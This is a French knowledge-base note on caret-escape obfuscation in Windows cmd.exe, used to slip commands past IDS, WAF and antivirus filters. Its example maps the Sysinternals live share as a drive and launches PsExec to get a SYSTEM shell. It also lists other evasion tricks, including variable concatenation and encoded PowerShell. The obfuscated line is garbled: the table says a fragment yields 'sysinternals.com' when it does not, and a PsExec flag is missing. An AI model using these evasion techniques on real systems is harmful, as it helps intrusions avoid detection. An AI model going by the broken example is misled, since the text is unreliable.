---
nom: commande-obfuscation — Contournement de filtrage CLI
description: Techniques de fragmentation et d'échappement pour contourner les filtres de commande
type: concept
date_creation: 2026-05-25
date_modification: 2026-05-25
version: 1.0.0
tags: [obfuscation, bypass, filter-evasion, windows, cmd, misc]
sources: [sources/windows.cheat.md]
---

## Définition

L'**obfuscation de commande** désigne l'ensemble des techniques visant à fragmenter ou altérer la représentation textuelle d'une commande afin de contourner des filtres de contenu (IDS/IPS, WAF, antivirus, règles de filtrage réseau).

## Technique : échappement avec `^` (Windows cmd)

Sous Windows `cmd.exe`, le caractère `^` sert à échapper le caractère suivant. Il peut être utilisé pour fragmenter les mots-clés sans altérer leur exécution :

```
# Original :
net use z: https://live.sysinternals.com/tools && z:\PsExec.exe -s -c cmd.exe

# Obfusqué :
net use z: htT^pS://li^ve.sysInTer^http://nals.com/toOls && z:\Ps^EXeC.eXe -s c^md.e^xe
```

### Fonctionnement

| Fragment | Résultat |
|---|---|
| `htT^pS` | `https` |
| `li^ve` | `live` |
| `sysInTer^http://nals.com` | `sysinternals.com` |
| `Ps^EXeC.eXe` | `PsExec.exe` |
| `c^md.e^xe` | `cmd.exe` |

Le shell `cmd.exe` interprète `^X` comme le caractère `X` (le `^` est consommé), produisant ainsi le même résultat que la commande non obfusquée.

## Autres techniques (non couvertes ici)

- **Variables d'environnement** : utiliser `%VAR%` pour construire des chaînes
- **Encodage Hex/Unicode** : `cmd /c echo ^68^65^6c^6c^6f`
- **Concaténation** : `cmd /c set A=ex& set B=ec& %A%%B%`
- **Invocations indirectes** : `powershell -enc <base64>`

## Avertissement

Ces techniques sont documentées à des fins éducatives et d'administration système. Leur utilisation dans des contextes non autorisés est illégale.

## Voir aussi

- [[psexec]] — PsExec et exécution à distance
- [[windows]] — Administration Windows
